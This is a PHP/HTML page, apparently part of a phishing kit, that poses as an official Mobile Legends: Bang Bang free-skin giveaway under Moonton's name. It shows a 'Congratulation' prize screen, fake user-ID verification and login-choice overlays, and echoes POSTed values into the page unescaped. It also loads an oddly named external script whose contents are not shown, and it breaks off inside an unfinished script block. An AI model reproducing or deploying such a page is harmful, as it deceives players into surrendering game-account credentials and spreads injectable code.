<?php
$nick = $_POST['nick'];
$img = $_POST['img'];
//MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($nick == "" && $img==""){
header("Location: ./");
}
?>
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <meta name="keywords" content="MLBB, MLBB New Arrival, MLBB Free Skin">
        <meta name="description" content="Invite friends to assemble time machine, chance to win Epic skin!">
        <meta name="author" content="Alex Ariandi">
        <title>Mobile Legends: Bang Bang</title>
        <meta property="og:url" content="./">
        <meta property="og:site_name" content="Mobile Legends: Bang Bang">
        <meta property="og:type" content="website">
        <meta name="copyright" content="Moonton">
        <meta name="theme-color" content="#000">
        <link rel="icon" href="https://m.mobilelegends.com/static/images/favicon.ico">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.2.0/css/all.css" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <style>
            * {
                margin: 0px;
                box-sizing: border-box;
            }
            body {
                    margin: 0px;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    font-family: 'Bebas Neue', cursive;
    width: 100%;
    height: 100vh;
            }
            .contalx {
                    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    max-width: 500px;
    width: 100%;
    background: url(alxFrontEnd/images/bg.jpg) no-repeat center;
    background-size: cover;
    height: 100%;
    max-height: 1080px;
            }
            .headeralx {
                    position: sticky;
    width: 100%;
    background: #000000ba;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    justify-content: space-between;
    align-items: center;
    padding: 8px 20px 5px;
    border-radius: 0px 0px 20px 20px;
    height: auto;
    z-index: 4;
    left: 0;
    top: 0;
            }
            .leftheaderalx {
                    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
            }
            .leftheaderalx img {
                    width: 35px;
            }
            .textheadealx {
                    color: #fff;
    margin-left: 5px;
    display: flex;
    flex-direction: column;
    align-items: flex-start;
            }
            .textheadealx span {
                font-size: 14px;
            }
            .headeralx i {
                    font-size: 2.1rem;
    color: #fff;
            }
            .banneralx {
                    width: 90%;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    margin-top: 5px;
        background: url(alxFrontEnd/images/bgbanner.png) no-repeat center;
    background-size: 100% 100%;
    padding: 9px;
            }
            .itemswiperalx {
                    width: 100%;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
            }
            .itemswiperalx img {
                    width: 100%;
            }
            .footeralx {
                    position: fixed;
    width: 100%;
    background: #000000ba;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    padding: 8px 10px 8px;
    border-radius: 20px 20px 0px 0px;
    height: auto;
    z-index: 4;
    bottom: 0;
    left: 0;
    color: #fff;
    text-align: center;
            }
            .footeralx img {
                    width: 35px;
    filter: grayscale(1);
    margin-bottom: 5px;
            }
            .footeralx p {
                    font-size: 13px;
            }
            .boxspinalx {
                    position: relative;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    width: 75%;
            }
            .wheelalx {
                    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    position: relative;
            }
            .boxhadiahalx {
            display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    position: relative;
    align-content: center;
    justify-content: center;
            }
            .bghadiahalx {
           display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    position: relative;
    justify-content: center;
            }
            .bghadiahalx img {
                    width: 100%;
            }
            .jarumspinalx {
                    position: absolute;
    z-index: 3;
    width: 100%;
    height: 100%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
            }
            .jarumbuletalx {
                background: #9a5e25;
    background-color: #e0b684;
    background-image: linear-gradient(180deg, #e0b684 20%, #9a5e25 100%);
    width: 60px;
    height: 60px;
    margin-bottom: 10px;
    border-radius: 100%;
    border: 2px solid #5c3623;
    box-shadow: 0px 0px 2px 0px #5c3623;
    position: relative;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
        transform: rotate(17deg);
            }
            .jarumbuletalx::before {
                content: '';
    width: 0;
    height: 0;
    border-left: 10px solid transparent;
    border-right: 10px solid transparent;
    border-bottom: 30px solid #e0b684;
    position: absolute;
    z-index: -1;
    top: -26px;
    color: #d5a648;
    filter: drop-shadow(0px 0px 3px black);
            }
            .buletanalx {
                    background: #9a5e25;
    background-color: #e0b684;
    background-image: linear-gradient(180deg, #e0b684 20%, #9a5e25 100%);
    border-radius: 100%;
    box-shadow: 0px 0px 2px 0px #5c3623;
    position: relative;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    transform: rotate(17deg);
    z-index: 2;
    width: 100%;
    height: 100%;
            }
            .jarumspinalx img {
                    position: absolute;
    width: 33px;
    opacity: 0.8;
    margin-bottom: 10px;
            }
            .bulathadiah {
               position: absolute;
    width: 250px;
    height: 250px;
    border-radius: 100%;
    z-index: 1;
    background: #a27349;
    margin-bottom: 10px;
    border: 1px solid #ffef9a;
            }
            .boxbulathadiah {
                    display: flex;
    flex-direction: row;
    position: absolute;
    width: 250px;
    height: 250px;
    border-radius: 100%;
    z-index: 1;
    background: transparent;
    margin-bottom: 10px;
    overflow: hidden;
            }
            .item1alx {
               clip-path: polygon(0 0, 50% 100%, 100% 0);
    overflow: hidden;
    height: 135px;
    width: 77px;
    right: 69px;
    top: 0px;
    position: absolute;
    transform: rotate(17deg);
    background: url(https://picsum.photos/id/237/200/300) no-repeat center;
    background-size: 100% 100%;
    list-style: circle;
    border-top: 1px solid gold;
        filter: brightness(0.9);
            }
            .item1alx img {
                    width: 100%;
    rotate: 347deg;
    margin-left: 10px;
            }
            .item2alx {
                clip-path: polygon(0 0, 50% 100%, 100% 0);
    overflow: hidden;
    height: 117px;
    width: 86px;
    right: 28px;
    top: 26px;
    position: absolute;
    transform: rotate(53deg);
    background: url(https://picsum.photos/id/237/200/300) no-repeat center;
    background-size: 100% 100%;
    list-style: circle;
    border-top: 1px solid gold;
        filter: brightness(0.9);
            }
            .item2alx img {
               width: 121%;
    rotate: 308deg;
    margin-top: -24px;
    margin-left: 15px;
            }
            .item3alx {
                clip-path: polygon(0 0, 50% 100%, 100% 0);
    overflow: hidden;
    height: 127px;
    width: 84px;
    right: 20px;
    top: 62px;
    position: absolute;
    transform: rotate(91deg);
    background: url(https://picsum.photos/id/237/200/300) no-repeat center;
    background-size: 100% 100%;
    list-style: circle;
    border-top: 1px solid gold;
        filter: brightness(0.9);
            }
            .item3alx img {
                width: 121%;
    rotate: 270deg;
    margin-left: -5px;
    margin-top: -30px;
            }
            .item4alx {
                clip-path: polygon(0 0, 50% 100%, 100% 0);
    overflow: hidden;
    height: 127px;
    width: 81px;
    right: 33px;
    top: 101px;
    position: absolute;
    transform: rotate(128deg);
    background: url(https://picsum.photos/id/237/200/300) no-repeat center;
    background-size: 100% 100%;
    list-style: circle;
    border-top: 1px solid gold;
        filter: brightness(0.9);
            }
            .item4alx img {
               width: 120%;
    rotate: 230deg;
    margin-left: 20px;
    margin-top: -60px;
            }
            .item5alx {
             clip-path: polygon(0 0, 50% 100%, 100% 0);
    overflow: hidden;
    height: 127px;
    width: 81px;
    right: 66px;
    bottom: -1px;
    position: absolute;
    transform: rotate(163deg);
    background: url(https://picsum.photos/id/237/200/300) no-repeat center;
    background-size: 100% 100%;
    list-style: circle;
    border-top: 1px solid gold;
        filter: brightness(0.9);
            }
            .item5alx img {
                width: 100%;
    rotate: 198deg;
    margin-left: -4px;
    margin-top: -29px;
            }
            .item6alx {
                    clip-path: polygon(0 0, 50% 100%, 100% 0);
    overflow: hidden;
    height: 127px;
    width: 78px;
    right: 107px;
    bottom: -1px;
    position: absolute;
    transform: rotate(198deg);
    background: url(https://picsum.photos/id/237/200/300) no-repeat center;
    background-size: 100% 100%;
    list-style: circle;
    border-top: 1px solid gold;
        filter: brightness(0.9);
            }
            .item6alx img {
                width: 110%;
    rotate: 165deg;
    margin-left: -5px;
    margin-top: -30px;
            }
            .item7alx {
                    clip-path: polygon(0 0, 50% 100%, 100% 0);
    overflow: hidden;
    height: 127px;
    width: 78px;
    right: 137px;
    bottom: 23px;
    position: absolute;
    transform: rotate(233deg);
    background: url(https://picsum.photos/id/237/200/300) no-repeat center;
    background-size: 100% 100%;
    list-style: circle;
    border-top: 1px solid gold;
        filter: brightness(0.9);
            }
            .item7alx img {
                width: 125%;
    rotate: 125deg;
    margin-left: -40px;
    margin-top: -59px;
            }
            .item8alx {
                    clip-path: polygon(0 0, 50% 100%, 100% 0);
    overflow: hidden;
    height: 127px;
    width: 85px;
    right: 146px;
    bottom: 61px;
    position: absolute;
    transform: rotate(269deg);
    background: url(https://picsum.photos/id/237/200/300) no-repeat center;
    background-size: 100% 100%;
    list-style: circle;
    border-top: 1px solid gold;
        filter: brightness(0.9);
            }
            .item8alx img {
                width: 121%;
    rotate: 90deg;
    margin-left: -10px;
    margin-top: -35px;
            }
            .item9alx {
                    clip-path: polygon(0 0, 50% 100%, 100% 0);
    overflow: hidden;
    height: 127px;
    width: 85px;
    right: 132px;
    bottom: 100px;
    position: absolute;
    transform: rotate(306deg);
    background: url(https://picsum.photos/id/237/200/300) no-repeat center;
    background-size: 100% 100%;
    list-style: circle;
    border-top: 1px solid gold;
        filter: brightness(0.9);
            }
            .item9alx img {
               width: 118%;
    rotate: 60deg;
    margin-left: -33px;
    margin-top: -27px;
            }
            .item10alx {
                    clip-path: polygon(0 0, 50% 100%, 100% 0);
    overflow: hidden;
    height: 122px;
    width: 77px;
    right: 106px;
    bottom: 128px;
    position: absolute;
    transform: rotate(343deg);
    background: url(https://picsum.photos/id/237/200/300) no-repeat center;
    background-size: 100% 100%;
    list-style: circle;
    border-top: 1px solid gold;
        filter: brightness(0.9);
            }
            .item10alx img {
                width: 100%;
    rotate: 15deg;
    margin-left: -12px;
    margin-top: -5px;
            }
            
            @-webkit-keyframes rotating /* Safari and Chrome */ {
              from {
                -webkit-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
              }
              to {
                -webkit-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
              }
            }
            @keyframes rotating {
              from {
                -ms-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -webkit-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
              }
              to {
                -ms-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -webkit-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
              }
            }
            .randomspin {
              -webkit-animation: rotating 0.7s linear infinite;
              -moz-animation: rotating 0.7s linear infinite;
              -ms-animation: rotating 0.7s linear infinite;
              -o-animation: rotating 0.7s linear infinite;
              animation: rotating 0.7s linear infinite;
            }
            .93deg::before {
                content: '';
                display: block;
            }
            .tridalx {
                    position: fixed;
    left: 0;
    top: 0;
    background: #0000009e;
    width: 100%;
    height: 100%;
    z-index: 9;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
            }
            .bxtridalx{
                    background: url(alxFrontEnd/images/box.png) no-repeat center;
    background-size: 100% 100%;
    padding: 5px 20px 35px;
    min-width: 85%;
    max-width: 90%;
    position: relative;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
            }
            .bxtridalx p {
                        font-size: 1rem;
    text-transform: uppercase;
    text-align: center;
            }
            .inputuid {
                    display: flex;
    flex-direction: row;
    justify-content: space-evenly;
    align-items: center;
    margin: 20px 0px 20px;
    width: 90%;
            }
            .inputuid input {
                    background: #000000ba;
    color: #fff;
    padding: 8px 5px;
    box-sizing: border-box;
    font-size: 18px;
    border: 2px solid #deaf3d;
    border-radius: 5px;
    outline: none;
            }
            #playidm {
                 width: 90%;
    margin-right: 5px;
            }
            #playzonem {
                 width: 55%;
            }
            .inputuid input::-webkit-input-placeholder { /* Edge */
  color: #cfcfcf;
}

.inputuid input:-ms-input-placeholder { /* Internet Explorer 10-11 */
  color: #cfcfcf;
}

.inputuid input::placeholder {
  color: #cfcfcf;
}
.trueid::before {
        content: 'USER ID VERIFICATION';
    position: absolute;
    top: -22px;
    display: block;
    background: url(alxFrontEnd/images/extend.png) no-repeat center;
    background-size: 100% 100%;
    width: 90%;
    text-align: center;
    color: #000;
    padding: 3px;
    font-size: 15px;
}
.hadiah::before {
        content: 'REWARD CONFIRMATION';
    position: absolute;
    top: -22px;
    display: block;
    background: url(alxFrontEnd/images/extend.png) no-repeat center;
    background-size: 100% 100%;
    width: 90%;
    text-align: center;
    color: #000;
    padding: 3px;
    font-size: 15px;
}
.hadiah img {
        width: 80px;
    padding: 20px 0px;
}
.bxtridalx button, #spnalx {
        background: url(alxFrontEnd/images/btn.png) no-repeat center;
    background-size: 100% 100%;
    color: #000;
    font-size: 1rem;
    font-family: inherit;
    border: none;
    outline: none;
    border-radius: 25px;
    padding: 13px 30px;
    filter: drop-shadow(5px 5px 8px black);
    font-weight: 500;
    text-transform: uppercase;
}
.alex-login {
  display: none;
  background: #000000c4;
  z-index: 999999;
  position: fixed;
  height: 100%;
  width: 100%;
  vertical-align: middle;
  text-align: center;
  top: 0;
  left: 0;
}

.pilihan-login {
  background: rgba(18, 39, 70, .94);
  position: relative;
  display: inline-block;
  width: 90vw;
  max-width: 675px;
  min-height: 80px;
  border: 1px solid #4c87d4;
  font-size: 12px;
  color: #98e8ff;
  top: 30%;
  border-radius: 5px;
}

.close-alexlog {
  position: absolute;
  width: 20px;
  height: 20px;
  top: 15px;
  right: 15px;
  background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADcAAAA3CAMAAACfBSJ0AAAA2FBMVEUAAAAJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOosJOotXhcVVgsRXkMhWhcVXk8lWjcZWisZWg8UJOosJOosJOoturtsJOotWjcd1qd1XkslalspXhMZZh8hpl9Vcmcx0tN9tm9lhn9Bdi8xjkdFnldRop9ZoptYJOouU2PiU1feU0veUz/aTvfGUxPOUwvKUv/KSu/GRufCPuPCUyfSUzPWMuPCUxvTfToqqAAAAOXRSTlMABAcOFVoijHIwGgtFMkInY0g7Hy2snX5VbFHPzs7TztPS0IeAeMOR0OfPycnCwcG5ube3qsWpqZKp+HMuAAAC5klEQVRIx52WZ3ujMAzH2wAh4EBYZiUhu2kue3TcHu1x3/8bnYuxFaUpeZ78X4GkHzYekm5K3Za6OSccgG21QshzKYDZCFEUVVEUQmoIRAGKWgaAVVFN0/dNU1UQWBXArMxYbwWGEbTqzHEMVgSwj6lmy/Js17U9q+UjUGA+BJgqqRUcURhmp9r2oMWuF9QlCFg98NxYO2y11GagQm7f7EStW3bsrPJ833Bi25AgYAbzN/Z5vmJ+q64S5mZ2s+WlzkPOtIwSTYAI05JomTM9OKnHBqxxLrC1VV5oMWpozRIErKk1RgsesNLsoORU33C3L6U6OoBHmN4RAVvX8FU+HuMOL2dAhAkdGHc0z/0fIQkSQiQmvXs+T7EucWOJQYtt8NtuWxhbNmK+LuU+uE60+C3EwZZv+i2OSc8icly+D+W+e3EyaiPQ9YzA8FyEtUdJMRwR58wPbBYw/C7U0SdO2rSbqTPRO9I6ZJ+zA1+cM1i1NoRMo8TRnCSawsfax1skQesEDPVxNNbDE8wCDIO/hIY0DEM6lO94tAowo5RmlRgGfwplNJPPGLsAzqoxDE6esx+nyqYTtCSnID84YXaKhfyYAIZBfoMTnWYYo3rCbytgGCTsKjadcUizf6CMhmOnafj8VJ4FSXGlopDS2avQjNIwKi4P4VjVeINX0ACNV/V/HAMQ/V/Feg7+Yg0q1hP2byoxAM/vH75M99+EZvLpHp+XaqxP+1UgxrpHGD0Cuwh8j30V6hf3ry/fEViBlff9AxAwG2H3Ir88dxFoAwj5rPtFqAv5DFlRPhP5sycDeih/fgI75E/I13OEyXyNwLnI11Af1p+Feu/qQ0/61o0Y180dYLge8RGld8frkah/T4Ch+vcefGL1D+rtBmO43qKpbhinwjzvuHX+YX2f84A7XDdTpwDXFf3EusBEPwH9CwN3lf3LjmHQv0C/tHm80C89bqBfurI/u7YfvLL/vLbfvb6/vraf/w98x+gfw1KaFwAAAABJRU5ErkJggg==) no-repeat;
  background-size: 100% 100%;
  cursor: pointer;
}

.ucapan-login {
  text-align: center;
  font-size: 22px;
  padding: 40px 0 30px;
  font-family: Arial;
  color: #fff;
  margin-top: 10px;
}

.btnlogalex {
  position: relative;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  width: 77%;
  height: 50px;
  line-height: 20px;
  background: url(data:image/png;base64,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) no-repeat;
  background-size: 100% 100%;
  margin: 0 auto 15px;
  padding-left: 15px;
  color: #fff;
  font-size: 18px;
  text-align: left;
  border: none;
}
.warn {
        background: #f8bf1f;
    color: #000;
    margin-top: 5px;
    padding: 3px 10px;
    border-radius: 5px;
    font-size: 14px;
    display: none;
}
.verifalx {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    width: 90%;
    padding: 20px 0px;
}
.headferifalx {
        background: url(alxFrontEnd/images/extend.png) no-repeat center;
    background-size: 100% 100%;
    padding: 10px 20px;
    font-weight: 500;
    width: 100%;
    text-align: center;
}
.formalx {
        background: url(alxFrontEnd/images/box.png) no-repeat center;
    background-size: 100% 100%;
    width: 100%;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    padding: 10px;
}
.formalx form {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
    width: 100%;
}
.formalx form label {
        font-size: 1.1rem;
    font-weight: 500;
    margin-bottom: 5px;
}
.formalx form select {
        background: #000000ba;
    color: #fff;
    padding: 8px 5px;
    box-sizing: border-box;
    font-size: 18px;
    border: 2px solid #deaf3d;
    border-radius: 5px;
    outline: none;
    width: 100%;
    margin-bottom: 10px;
    font-family: 'Bebas Neue', cursive;
}
.btnverifalx {
        width: 100%;
    text-align: center;
    margin: 10px 0px;
}
.btnverifalx button {
        background: url(alxFrontEnd/images/btn.png) no-repeat center;
    background-size: 100% 100%;
    color: #000;
    font-size: 1rem;
    font-family: inherit;
    border: none;
    outline: none;
    border-radius: 25px;
    padding: 13px 30px;
    filter: drop-shadow(5px 5px 8px black);
    font-weight: 500;
    text-transform: uppercase;
}
.formalx p {
        text-align: center;
}
.formalx img {
        width: 80px;
    background: url(alxFrontEnd/images/bgbanner.png) no-repeat center;
    background-size: 100% 100%;
    padding: 2px;
    margin: 10px 0px;
}
        </style>
    </head>
    <body>
    	<div class="contalx">
        <div class="headeralx">
            <div class="leftheaderalx">
                <img src="alxFrontEnd/images/moonton.png" alt="" />
                <div class="textheadealx">
                    <p>Mobile Legends</p>
                    <span>Sent Gift</span>
                </div>
            </div>
            <i class="fa-regular fa-bars"></i>
        </div>
        <div class="banneralx">
            <div class="itemswiperalx">
                <img src="https://img.youtube.com/vi/cTSGv8-6_Yo/maxresdefault.jpg" alt="" />
            </div>
        </div>
        
        <div class="verifalx">
            <div class="headferifalx">Congratulation <?php echo $_POST['nick'];?></div>
            <div class="formalx">
                <p>Prizes will be sent within the next 6 hours. Please check your inbox to claim!</p>
                <img src="<?php echo $_POST['img'];?>" alt="">
                <div class="btnverifalx">
                    <button class="nextcarlos" onmousedown="buka.play();">continue</button>
                </div>
            </div>
        </div>

        <div class="footeralx">
            <img src="alxFrontEnd/images/moonton.png" alt="" />
            <p>&copy; Moonton Technology Co. Ltd</p>
            <p>Privacy Policy | Term of Service | Rules of Conduct | Official Community Policy</p>
        </div>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>        
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	    <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
	    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
	    <script type="text/javascript" src="https://unpkg.com/package-ions@2.1.4-Base/ionicons.map.js"></script>
	    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
	    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>        
<script>
$(document).ready(function() {
